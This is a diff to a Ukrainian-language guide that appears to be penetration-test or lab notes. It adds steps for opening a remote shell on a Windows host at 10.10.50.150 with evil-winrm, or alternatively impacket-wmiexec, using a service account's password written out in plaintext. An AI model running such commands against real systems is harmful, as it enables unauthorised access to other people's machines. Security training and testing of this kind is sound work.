@@ -160,11 +160,17 @@ exit
 
 Встановити evil-winrm якщо нема:
 ```
-sudo apt install -y ruby-full && sudo gem install evil-winrm
+sudo apt install -y libreadline-dev ruby-dev ruby-full && sudo gem install evil-winrm
 ```
 
+Підключення через evil-winrm:
 ```
 evil-winrm -i 10.10.50.150 -u svc_deploy -p "Deploy@2024!Drone"
+```
+
+АБО через impacket (якщо evil-winrm не встановився):
+```
+impacket-wmiexec svc_deploy:'Deploy@2024!Drone'@10.10.50.150
 ```
 
 Знайти сервіс:
